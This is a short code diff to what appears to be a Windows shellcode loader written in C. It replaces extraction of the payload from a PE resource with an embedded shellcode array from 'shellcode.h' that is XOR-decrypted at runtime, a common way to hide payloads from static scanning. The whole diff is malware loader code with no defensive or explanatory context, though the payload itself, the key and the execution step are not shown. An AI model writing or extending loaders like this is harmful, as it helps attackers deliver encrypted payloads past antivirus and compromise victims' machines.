@@ -2,26 +2,20 @@
 #include <stdlib.h>
 #include <string.h>
 #include "payload.h"
-#include "resource.h"
+#include "shellcode.h"
+
+static void ldr_xor_decrypt(unsigned char *buf, size_t len) {
+    for (size_t i = 0; i < len; i++)
+        buf[i] ^= key[i % sizeof(key)];
+}
 
 unsigned char *ldr_extract_shellcode(size_t *out_len) {
-    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_SHELLCODE), RT_RCDATA);
-    if (!hRes) return NULL;
-
-    HGLOBAL hData = LoadResource(NULL, hRes);
-    if (!hData) return NULL;
-
-    DWORD sz = SizeofResource(NULL, hRes);
-    if (sz == 0) return NULL;
-
-    void *locked = LockResource(hData);
-    if (!locked) return NULL;
-
-    unsigned char *buf = (unsigned char *)malloc(sz);
+    unsigned char *buf = (unsigned char *)malloc(sizeof(shellcode));
     if (!buf) return NULL;
 
-    memcpy(buf, locked, sz);
-    *out_len = sz;
+    memcpy(buf, shellcode, sizeof(shellcode));
+    ldr_xor_decrypt(buf, sizeof(shellcode));
+    *out_len = sizeof(shellcode);
     return buf;
 }
 
